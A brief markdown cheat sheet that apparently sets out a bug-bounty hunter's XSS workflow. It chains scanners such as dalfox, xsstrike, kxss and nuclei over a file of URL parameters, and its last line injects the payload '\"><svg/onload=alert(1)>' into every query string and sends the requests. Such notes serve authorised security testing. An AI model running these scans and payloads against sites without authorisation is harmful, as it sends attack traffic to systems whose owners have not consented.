## XSS Automation

**Requirement:** `parameter.txt`
```bash
dalfox file parameters.txt --custom-payload payloads.txt
python3 xsstrike.py -f parameters.txt --payload payloads.txt
cat parameters.txt | kxss > reflected.txt
cat parameters.txt | gxss -o gxss.txt
cat parameters.txt | kxss | dalfox pipe --custom-payload payloads.txt
```

## My XSS Workflow

**Requirement:** `parameter.txt`
```bash
cat parameter.txt | uro > uro.txt
cat uro.txt | kxss > reflected.txt
dalfox file reflected.txt --only-discovery
nuclei -l reflected.txt -t http/vulnerabilities/ -tags xss -severity medium,high,critical
cat reflected.txt | qsreplace '\"><svg/onload=alert(1)>' | httpx -silent
```
